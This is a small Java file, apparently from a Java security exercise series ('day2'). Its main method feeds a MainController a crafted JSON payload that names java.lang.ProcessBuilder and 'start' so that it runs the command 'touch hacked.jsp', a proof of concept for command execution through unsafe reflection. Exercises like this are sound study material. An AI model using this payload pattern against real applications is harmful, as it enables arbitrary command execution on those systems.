package com.ananaskr.day2;

import java.io.IOException;

public class day2 {
    public static void main(String[] args) throws IOException {
        String rawJson = "{\"controller\":\"java.lang.ProcessBuilder\",\"task\":\"start\",\"data\":[\"touch\",\"hacked.jsp\"]}";
        MainController con = new MainController(rawJson);

    }
}
